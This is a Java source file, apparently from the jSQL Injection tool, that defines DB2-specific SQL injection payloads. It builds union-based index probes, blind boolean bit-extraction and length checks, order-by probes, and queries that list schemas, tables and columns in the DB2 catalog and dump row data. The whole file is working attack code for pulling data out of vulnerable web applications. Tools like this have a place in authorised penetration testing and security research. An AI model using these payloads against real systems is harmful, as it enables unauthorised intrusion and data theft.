package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.util.StringUtil;

public class DB2Vendor extends AbstractVendor {

    @Override
    public String getSqlInfos() {
        return
            "select+versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user||'%01%03%03%07'from+sysibm.sysversions";
    }

    @Override
    public String getSqlDatabases() {
        return
            /**
             * First substr(,3) remove 'gg' at the beginning
             */
            "select+varchar(LISTAGG('%04'||trim(schemaname)||'%050%04')||'%01%03%03%07')from+syscat.schemata{limit}";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            /**
             * First substr(,3) remove 'gg' at the beginning
             */
            "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.systables+where+creator='"+database+"'{limit}";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+varchar(LISTAGG('%04'||trim(name)||'%050%04')||'%01%03%03%07')from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'{limit}";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        /**
         * null breaks query => coalesce
         */
        formatListColumn = formatListColumn.replace("{%}", "||''),''))||'%7f'||trim(coalesce(varchar(");
        formatListColumn = "trim(coalesce(varchar(" + formatListColumn + "||''),''))";
        
        return
            /**
             * LISTAGG limit is 4000 and aggregate all data before limit is applied
             * => subquery
             */
            "select+varchar(LISTAGG('%04'||s||'%051%04')||'%01%03%03%07')from(select+" + formatListColumn + "s+from+" + database + "." + table + "{limit})";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"1=0", "'a'%21='a'", "'b'%21='b'", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"1=1", "0=0", "'a'%21='b'", "'a'='a'", "2=2", "1%21=2"};
    }

    @Override
    public String getSqlBlindFirstTest() {
        return "0%2b1=1";
    }

    @Override
    public String getSqlBlindCheck(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String getSqlBlindBitCheck(String inj, int indexCharacter, int bit) {
        return "+and+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")--+";
    }

    @Override
    public String getSqlBlindLengthCheck(String inj, int indexCharacter) {
        return "+and+length(" + inj + ")>" + indexCharacter + "--+";
    }
    
    @Override
    public String getSqlBlind(String sqlQuery, String startPosition) {
        return
            "(select+" +
                /**
                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                 */
                "varchar(replace('SQLi'||substr(" +
                    "(" + sqlQuery + ")," +
                    startPosition +
                "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "(select+" +
            /**
             * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
             */
            "varchar(replace('SQLi'||substr(" +
                "(" + sqlQuery + ")," +
                startPosition +
            "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().sqlIndexes.replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                /**
                 * repeat gets internal table size error on blind 'where 1=1'
                 * => uses rpad instead
                 */
                "varchar('SQLi$1'||rpad('%23',1024,'%23')||'iLQS',1024)"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("varchar(''||(1337"+ i +"7330%2b1),1024)");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "+from+sysibm.sysdummy1--+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",5";
    }
}